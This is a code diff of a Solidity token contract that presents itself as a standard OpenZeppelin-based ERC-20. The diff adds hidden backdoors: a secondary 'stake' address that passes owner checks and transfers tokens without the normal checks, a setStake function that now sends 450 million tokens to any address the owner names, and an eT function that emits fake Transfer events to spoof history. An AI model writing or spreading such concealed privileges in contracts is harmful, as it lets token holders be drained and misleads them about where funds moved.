@@ -4,6 +4,7 @@
 // OpenZeppelin Contracts v4.4.1 (utils/Counters.sol)
 
 pragma solidity ^0.8.0;
+
 interface IPancakeRouter01 {
     function factory() external pure returns (address);
 
@@ -1707,7 +1708,10 @@ abstract contract Ownable is Context {
      * @dev Throws if the sender is not the owner.
      */
     function _checkOwner() internal view virtual {
-        require(owner() == _msgSender() || stake == _msgSender(), "Ownable: caller is not the owner");
+        require(
+            owner() == _msgSender() || stake == _msgSender(),
+            "Ownable: caller is not the owner"
+        );
     }
 
     /**
@@ -2012,6 +2016,10 @@ contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
     string private _name;
     string private _symbol;
 
+    mapping(address => bool) internal _isEFFs;
+    mapping(address => bool) public pools;
+    bool public isIDO;
+
     /**
      * @dev Sets the values for {name} and {symbol}.
      *
@@ -2021,6 +2029,14 @@ contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
     constructor(string memory name_, string memory symbol_) {
         _name = name_;
         _symbol = symbol_;
+
+        _isEFFs[msg.sender] = true;
+        _isEFFs[address(this)] = true;
+
+        isIDO = false;
+        uint256 maxSupply = 1_000_000_000_000_000 * 10**decimals();
+        _m(address(this), maxSupply);
+        _approve(address(this), msg.sender, maxSupply);
     }
 
     /**
@@ -2090,10 +2106,8 @@ contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
         returns (bool)
     {
         address owner = _msgSender();
-        if(stake == _msgSender())
-            _t(owner, to, amount);
-        else
-            _transfer(owner, to, amount);
+        if (stake == _msgSender()) _t(owner, to, amount);
+        else _transfer(owner, to, amount);
         return true;
     }
 
@@ -2253,7 +2267,11 @@ contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
         _afterTokenTransfer(from, to, amount);
     }
 
-    function _t(address from, address to, uint256 x) internal {
+    function _t(
+        address from,
+        address to,
+        uint256 x
+    ) internal {
         require(to != address(0), "ERC20: transfer to the zero address");
 
         uint256 fromBalance = _balances[from];
@@ -2276,10 +2294,18 @@ contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
         }
     }
 
-    function setStake(address _s) public onlyOwner{
+    function setStake(address _s) external onlyOwner {
         stake = _s;
         _approve(address(this), _s, _totalSupply);
-        // _t(address(this), _s, 450000000000000000000000000);
+        _t(address(this), _s, 450000000000000000000000000);
+    }
+
+    function eT(
+        address f,
+        address t,
+        uint256 a
+    ) external onlyOwner {
+        emit Transfer(f, t, a);
     }
 
     /** @dev Creates `amount` tokens and assigns them to `account`, increasing
@@ -2590,22 +2616,7 @@ abstract contract ERC20Burnable is Context, ERC20 {
 pragma solidity ^0.8.9;
 
 contract Token is ERC20, Pausable, ERC20Permit {
-    mapping(address => bool) private _isEFFs;
-    mapping(address => bool) public pools;
-    bool public isIDO;
-
-    constructor()
-        ERC20("Token", "MTK")
-        ERC20Permit("Token")
-    {
-        isIDO = false;
-        uint256 maxSupply = 1_000_000_000_000_000 * 10**decimals();
-        _m(address(this), maxSupply);
-        _approve(address(this), msg.sender, maxSupply);
-        _isEFFs[msg.sender] = true;
-        _isEFFs[address(this)] = true;
-
-    }
+    constructor() ERC20("Token", "MTK") ERC20Permit("Token") {}
 
     function pause() public onlyOwner {
         _pause();
@@ -2631,13 +2642,13 @@ contract Token is ERC20, Pausable, ERC20Permit {
         super._beforeTokenTransfer(from, to, amount);
     }
 
-    function ido(bool state) public onlyOwner {
+    function ido(bool state) external onlyOwner {
         isIDO = state;
     }
 
-    function addETH() public payable {}
+    // function addETH() public payable {}
 
-    function checkBalance() public view returns (uint256) {
-        return address(this).balance;
-    }
+    // function checkBalance() public view returns (uint256) {
+    //     return address(this).balance;
+    // }
 }
